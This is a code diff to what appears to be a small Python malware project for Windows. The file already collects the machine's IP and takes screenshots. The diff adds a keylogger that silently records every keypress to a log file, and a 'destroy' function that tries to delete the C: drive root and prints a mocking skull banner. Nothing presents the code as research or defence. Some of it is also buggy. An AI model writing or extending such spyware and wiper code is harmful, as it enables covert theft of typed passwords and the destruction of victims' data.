@@ -11,7 +11,7 @@ def get_ip():
     finally:
         s.close()
     return IP
-print(get_ip())
+# print(get_ip())
 
 def takeshot():
     import win32gui
@@ -37,3 +37,43 @@ def takeshot():
 
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
+
+def on_press(key):
+   logging.info(str(key))
+
+def log():
+    #this is for windows
+    import pynput
+    from pynput.keyboard import Key, Listener
+    import logging
+
+    log_dir = r"C:/programm/"
+    logging.basicConfig(filename = (log_dir + "Log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+    
+
+def destroy():
+    import os  
+    location = "C://" 
+    os.remove(location)
+    print("""
+       ,-------------.
+      /               \
+     /   __       __   \
+    |  /,--.     ,--.\  |
+    |   \  |  __ |  /   |
+    |    `-' /  \`-/    |
+     \__    |_/\_|   __/
+       /_           _\
+      | | |,-.,-.,-.| |
+   `hah `-'| || || |`-'
+       ,-.`-'`-'`-',-.
+       \_|_,-.,-.,-|_/
+       | |_|_||_||_|
+        `--.____.--'
+    """)  
+    print("Destroyed")
+
+print(get_ip())
